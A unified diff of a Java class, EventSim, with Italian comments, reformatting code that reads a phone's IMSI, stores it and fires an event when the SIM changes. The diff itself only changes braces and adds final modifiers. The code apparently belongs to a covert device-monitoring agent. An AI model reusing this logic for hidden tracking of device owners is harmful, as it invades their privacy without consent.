@@ -51,38 +51,43 @@ public class EventSim extends EventBase implements Observer<Sim> {
 
 	// Viene richiamata dal listener (dalla dispatch())
 	public int notification(Sim s) {
-		if(Cfg.DEBUG) Check.log( TAG + " Got SIM status notification: " + s.getImsi());
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " Got SIM status notification: " + s.getImsi());
+		}
 
 		// Verifichiamo la presenza della SIM
-		if (s.getImsi().length() == 0)
+		if (s.getImsi().length() == 0) {
 			return 0;
-		
+		}
+
 		Markup storedImsi = new Markup(EventType.EVENT_SIM_CHANGE);
 
 		// Vediamo se gia' c'e' un markup
 		if (storedImsi.isMarkup() == true) {
 			try {
-				byte[] actual = storedImsi.readMarkup();
-				String storedValue = new String(actual);
-				
+				final byte[] actual = storedImsi.readMarkup();
+				final String storedValue = new String(actual);
+
 				if (storedValue.contentEquals(s.getImsi()) == false) {
 					// Aggiorniamo il markup
-					byte[] value = s.getImsi().getBytes();
+					final byte[] value = s.getImsi().getBytes();
 					storedImsi.writeMarkup(value);
-					
+
 					onEnter();
 				}
-			} catch (IOException e) {
-				if(Cfg.DEBUG) { Check.log(e); }
+			} catch (final IOException e) {
+				if (Cfg.DEBUG) {
+					Check.log(e);
+				}
 			}
 		} else {
-			String imsi = Device.self().getImsi();
-			
-			byte[] value = imsi.getBytes();
-			
+			final String imsi = Device.self().getImsi();
+
+			final byte[] value = imsi.getBytes();
+
 			storedImsi.writeMarkup(value);
 		}
-		
+
 		storedImsi = null;
 		return 0;
 	}
